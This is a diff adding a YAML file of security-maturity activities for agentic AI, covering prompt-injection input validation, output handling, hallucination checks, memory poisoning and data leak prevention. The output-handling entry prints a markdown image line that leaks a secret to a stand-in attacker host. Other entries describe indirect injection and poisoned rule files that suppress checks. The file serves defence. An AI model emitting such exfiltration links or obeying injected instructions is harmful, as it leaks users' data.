@@ -1,0 +1,364 @@
+# yaml-language-server: $schema=../../schemas/dsomm-schema-agentic-ai.json
+---
+Agentic AI:
+  Data Protection:
+    Basic data leak prevention: # TODO May be split into 2 activities, one for training and one for contract related topics
+      uuid: dc62d384-0b9c-47d9-b7a5-9d82e53642ba
+      description: |-
+        Data shared with AI tools (prompts, attached files, repository content) may
+        leave the organization and may be stored or used for model training by the
+        provider. Basic data leak prevention defines what may be shared with which
+        tool and uses contractual and technical provider settings to protect it.
+      risk: |-
+        Developers paste secrets, personal data or confidential source code into AI
+        tools. The data is processed by third parties, potentially stored, used for
+        training or leaked in a provider breach.
+      measure: |-
+        Define which data classes may be used with which AI tools. If a commercial AI is used, use AI
+        offerings with training opt-out and data retention agreements. Train
+        employees to keep secrets and personal data out of prompts.
+      dependsOn:
+        - a511a9a9-1b75-4dfd-8a4f-e516e8096150 # AI usage policy
+      assessment: |
+        - Show the definition of which data classes may be used with which AI tools.
+        - Show the enterprise agreements or provider settings (training opt-out, data retention).
+        - Show the training or awareness material that tells employees to keep secrets and personal data out of prompts.
+      difficultyOfImplementation:
+        knowledge: 2
+        time: 2
+        resources: 1
+      usefulness: 4
+      level: 2
+      tags:
+        - ai
+        - data-protection
+      implementation:
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/aisvs-c01
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/aisvs-c08
+      references:
+        samm2:
+          - O-EM-A-1
+        iso27001-2017:
+          - 8.2.3
+          - 13.2.4
+        iso27001-2022:
+          - 5.10
+          - 5.14
+      comments: ""
+    Input validation for AI systems:
+      uuid: 0012e51c-a068-4549-a4d5-d1957b52676f
+      description: |-
+        Everything that enters a model context is input: user prompts, but
+        also documents retrieved via retrieval-augmented generation (RAG),
+        web content, source code, issues and tool results. Prompt injection prevention treats all of it as untrusted data
+        and validates or constrains it before the model processes it.
+      risk: |-
+        Attacker-controlled content (e.g. a hidden instruction in a retrieved
+        document, web page or code comment) is interpreted as an instruction by the
+        model. The attacker overrides the system prompt, extracts confidential
+        context or triggers unintended tool calls ([indirect prompt injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/#:~:text=triggers%20unexpected%20behavior).-,Indirect%20Prompt%20Injections,-Indirect%20prompt%20injections)).
+      measure: |-
+        Validate and constrain all input entering the model context: separate
+        instructions from data in prompt templates, sanitize or annotate untrusted
+        content, restrict input length and format where possible and use guardrail
+        filters that detect known injection patterns before the model call.
+      assessment: |
+        - Show prompt templates that separate instructions from untrusted data.
+        - Show the guardrail or filter configuration applied before the model call and a test where a known injection pattern is detected.
+      difficultyOfImplementation:
+        knowledge: 4
+        time: 3
+        resources: 2
+      usefulness: 5
+      level: 3
+      tags:
+        - ai
+        - data-protection
+        - input-validation
+      implementation:
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/aisvs-c02
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/owasp-llm-top-10
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/owasp-agentic-top-10
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/llm-guard
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/lakera-guard
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/nemo-guardrails
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/tealtiger
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/trufflehog
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/owasp-ai-exchange
+      references:
+        samm2:
+          - D-SR-A-1
+        iso27001-2017:
+          - 14.2.5
+        iso27001-2022:
+          - 8.27
+      comments: ""
+    Secure output handling in AI applications:
+      uuid: 24990a5e-b0e6-4e2c-b06b-4e9f0d6f7b21
+      description: |-
+        Model output is attacker-influenceable: prompt injection can make an
+        AI feature emit script tags, shell commands or malicious tool calls.
+        If the application renders or executes such responses unvalidated,
+        classic attacks (cross-site scripting, command and SQL injection)
+        reach their sinks through a new path. Model responses must therefore
+        be treated like user input. The sink-side controls are already defined
+        in OWASP DSOMM [Context-aware output encoding](/activity-description?uuid=e1f37abb-d848-4a3a-b3df-65e91a89dcb7); this activity applies them to the
+        AI features the organization ships (chat UIs, retrieval-augmented
+        generation (RAG) features, tool-calling agents) and adds the
+        AI-specific controls: strict markdown rendering, schema enforcement
+        for tool calls and output guardrails.
+
+        The core of this activity is a reference: model responses are
+        untrusted data, and the sink-side controls are already defined in
+        [Context-aware output encoding](/activity-description?uuid=e1f37abb-d848-4a3a-b3df-65e91a89dcb7) (Implementation, Application
+        Hardening): safe framework bindings, encoding libraries,
+        parameterized APIs, Content Security Policy. Apply them to model
+        output exactly as to user input.
+
+        AI-specific additions on top of it:
+
+        - **Markdown rendering in chat UIs**: render with inline HTML
+          disabled (e.g. `markdown-it` with `html: false`) plus an
+          allow-list HTML sanitizer (e.g. DOMPurify). Markdown links and
+          images are a data exfiltration channel: An injected
+          `![](https://attacker.example/?d=<secret>)` leaks context data on
+          render without any click. So block or proxy external images and
+          restrict link/image URLs to trusted domains.
+        - **Tool/function calls**: enforce a JSON schema on structured
+          output, validate tool-call arguments against allow-lists and
+          require human confirmation for sensitive calls.
+
+        Whether the content of a response is factually correct is a separate
+        concern, see _Hallucination detection for AI responses_.
+      risk: |-
+        An attacker uses prompt injection to make the model emit malicious output,
+        which the application then executes or renders: cross-site scripting,
+        command or SQL injection, or unauthorized high-privilege tool calls.
+      measure: |-
+        Treat model responses as untrusted data and apply the existing activity
+        [Context-aware output encoding](/activity-description?uuid=e1f37abb-d848-4a3a-b3df-65e91a89dcb7) to them at every sink (browser, shell,
+        SQL, downstream systems). Add the AI-specific controls on top: strict
+        markdown rendering, schema enforcement for tool calls and output
+        guardrails.
+      dependsOn:
+        - 0012e51c-a068-4549-a4d5-d1957b52676f # Input validation for AI systems
+        - e1f37abb-d848-4a3a-b3df-65e91a89dcb7 # Context-aware output encoding
+      assessment: |
+        - Show the rendering pipeline for model output (markdown renderer settings, sanitizer configuration, Content Security Policy).
+        - Show the schema validation for structured output and the confirmation step for sensitive tool calls.
+        - Demonstrate with a test that injected markup and markdown-based exfiltration (external images/links) are neutralized.
+      difficultyOfImplementation:
+        knowledge: 3
+        time: 3
+        resources: 2
+      usefulness: 5
+      level: 4
+      tags:
+        - ai
+        - data-protection
+        - input-validation
+      implementation:
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/aisvs-c07
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/owasp-llm-top-10
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/guardrails-ai
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/nemo-guardrails
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/dompurify
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/owasp-cheatsheet-series
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/owasp-ai-exchange
+      references:
+        samm2:
+          - D-SR-A-2
+        iso27001-2017:
+          - 14.2.5
+        iso27001-2022:
+          - 8.27
+      comments: ""
+    Hallucination detection for AI responses:
+      uuid: 51a63793-c2c5-4438-bfd6-b7dee604a76d
+      description: |-
+        Distinct from output encoding (a security control against malicious
+        output, see _Secure output handling in AI applications_), this activity
+        addresses correctness: model output can be confidently wrong, with
+        fabricated facts, citations, URLs, API endpoints and identifiers.
+        Hallucinations become a security problem when downstream components
+        or users trust them: hallucinated links and package names can be
+        registered by attackers, fabricated identifiers corrupt data, invented
+        facts drive wrong decisions. Applies to AI features the organization
+        ships.
+
+        Practical layers, ordered by effort:
+
+        1. **Constrain generation**: prefer retrieval-augmented generation
+           over free generation for factual answers and instruct the model
+           to answer only from the provided sources and to say "I don't
+           know" otherwise.
+        2. **Groundedness rails**: fact-checking rails compare each claim in
+           the response against the retrieved source passages and block or
+           flag unsupported claims (NeMo Guardrails fact-check rail,
+           Guardrails AI provenance/grounding validators).
+        3. **Existence checks**: mechanically verify artifacts the model
+           emits before they are shown or used. Do referenced URLs resolve,
+           do cited documents exist in the knowledge base, do emitted API
+           endpoints and identifiers exist in the target system?
+        4. **Citations and confidence**: require source citations in
+           user-facing answers and display them, so users can verify claims;
+           route ungrounded or low-confidence answers to a human fallback.
+        5. **Regression testing**: track hallucination rates with an
+           evaluation suite (e.g. promptfoo) over prompt, model and
+           guardrail changes.
+      risk: |-
+        Users and downstream systems act on fabricated AI content: they follow
+        hallucinated URLs that attackers have registered, store invented
+        identifiers, or make decisions based on confidently presented false
+        facts, all without any attacker involvement in the prompt.
+      measure: |-
+        Validate the factual grounding of AI responses before they are trusted:
+        check claims against the retrieved sources in retrieval-augmented
+        generation (RAG) systems, require and
+        verify citations, verify that emitted URLs, API endpoints and
+        identifiers exist, and route low-confidence or ungrounded answers to a
+        human or suppress them.
+      dependsOn:
+        - 24990a5e-b0e6-4e2c-b06b-4e9f0d6f7b21 # Secure output handling in AI applications
+      assessment: |
+        - Show the groundedness or fact-checking configuration and citations in user-facing answers.
+        - Show the existence checks for emitted URLs, API endpoints and identifiers.
+        - Show evaluation results tracking the hallucination rate over prompt, model and guardrail changes.
+      difficultyOfImplementation:
+        knowledge: 4
+        time: 3
+        resources: 2
+      usefulness: 3
+      level: 4
+      tags:
+        - ai
+        - data-protection
+      implementation:
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/nemo-guardrails
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/guardrails-ai
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/promptfoo
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/aisvs-c07
+      references:
+        samm2:
+          - D-SR-A-2
+        iso27001-2017:
+          - 14.2.5
+        iso27001-2022:
+          - 8.27
+      comments: ""
+    Protection of agent memory against poisoning:
+      uuid: 106622af-8969-4d9b-81ad-86d8e2bfd631
+      description: |-
+        Unlike one-time prompt injection, memory poisoning persists: AI agents
+        retain context across sessions in rule files (e.g. CLAUDE.md, AGENTS.md),
+        memory directories, conversation summaries and retrieval-augmented
+        generation (RAG) knowledge/vector stores. Content
+        an attacker smuggles into this persistent state (via issues, code
+        comments, documents or web content the agent processes) corrupts every
+        future session and can spread to all developers through version control.
+      risk: |-
+        An attacker manipulates the agent into persisting malicious instructions
+        into its memory or shared rule files. The backdoor survives session
+        restarts, biases future reasoning and tool use (e.g. suppressing security
+        checks, exfiltrating data) and propagates across the team via the
+        repository or shared knowledge bases.
+      measure: |-
+        Treat writes to agent memory and rule files like code changes: keep them
+        under version control and human review, restrict write access to shared
+        rule files and knowledge/vector stores, validate the provenance of
+        ingested knowledge and periodically review or reset persistent memory.
+        Apply retention limits (time-to-live) so that unverified memory,
+        especially content derived from external inputs or tool outputs,
+        expires instead of persisting indefinitely. Version memory stores so
+        that detected poisoning can be answered by rolling back to a
+        known-good state instead of purging everything. Segment memory by
+        user and session and keep credentials and other secrets out of it:
+        cached secrets in shared memory let a later session act with the
+        permissions of an earlier one (OWASP Top 10 for Agentic
+        Applications, ASI03). Do not re-ingest the agent's own outputs into
+        trusted memory automatically, as this self-reinforces errors and
+        planted instructions ("bootstrap poisoning", ASI06).
+      dependsOn:
+        - 0012e51c-a068-4549-a4d5-d1957b52676f # Input validation for AI systems
+      assessment: |
+        - Show that agent rule files and memory are under version control and require review on change.
+        - Show the write-access restrictions on shared rule files and knowledge/vector stores.
+        - Show the last review or reset of persistent agent memory.
+        - Show the retention limits for unverified memory and demonstrate a rollback of a memory store to a known-good state.
+        - Show the memory segmentation between users and sessions and the rule that keeps credentials out of agent memory.
+      difficultyOfImplementation:
+        knowledge: 3
+        time: 2
+        resources: 1
+      usefulness: 4
+      level: 5
+      tags:
+        - ai
+        - data-protection
+      implementation:
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/ai-coding-cli-permissions
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/aisvs-c08
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/owasp-agentic-top-10
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/anthropic-zero-trust-agents
+      references:
+        samm2:
+          - O-EM-A-2
+        iso27001-2017:
+          - 12.1.2
+        iso27001-2022:
+          - 8.9
+      comments: ""
+    Automated data leak detection for AI interactions:
+      uuid: 8d5ce64e-ebf0-45ab-93cb-d592287e3023
+      description: |-
+        Technical controls (e.g. AI gateways/proxies, secret scanners on prompts,
+        DLP filters) automatically detect and block sensitive data such as secrets,
+        access tokens and personal data before it is sent to external AI services.
+
+        Typical setup: route all model traffic through an LLM gateway (e.g.
+        LiteLLM Proxy) and attach scanners as guardrail hooks, such as
+        Presidio for PII redaction and LLM Guard or trufflehog-style secret
+        detectors for credentials. Commercial alternatives with managed AI-DLP include
+        Nightfall AI, Prompt Security, Lakera Guard and the GenAI-DLP features
+        of CASB/SSE platforms (e.g. Netskope, Zscaler).
+      risk: |-
+        Policies and awareness alone do not prevent accidental leaks. A single pasted
+        production credential or customer data set in a prompt can lead to a
+        compromise or a privacy violation.
+      measure: |-
+        Route traffic to external AI services through a gateway that scans prompts
+        and attachments for secrets and personal data, blocks or redacts findings
+        and provides an audit trail of AI tool usage.
+      dependsOn:
+        - dc62d384-0b9c-47d9-b7a5-9d82e53642ba # Basic data leak prevention
+      assessment: |
+        - Show the gateway or proxy through which traffic to external AI services flows and its scanner configuration.
+        - Demonstrate that a test secret or test personal data in a prompt is blocked or redacted.
+        - Show the audit trail of AI tool usage.
+      difficultyOfImplementation:
+        knowledge: 3
+        time: 3
+        resources: 3
+      usefulness: 4
+      level: 4
+      tags:
+        - ai
+        - data-protection
+      implementation:
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/aisvs-c12
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/litellm
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/llm-guard
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/presidio
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/trufflehog
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/nightfall-ai
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/prompt-security
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/tealtiger
+        - $ref: src/assets/YAML/default/implementations.yaml#/implementations/lakera-guard
+      references:
+        samm2:
+          - O-EM-A-2
+        iso27001-2017:
+          - 13.2.3
+        iso27001-2022:
+          - 8.12
+      comments: ""
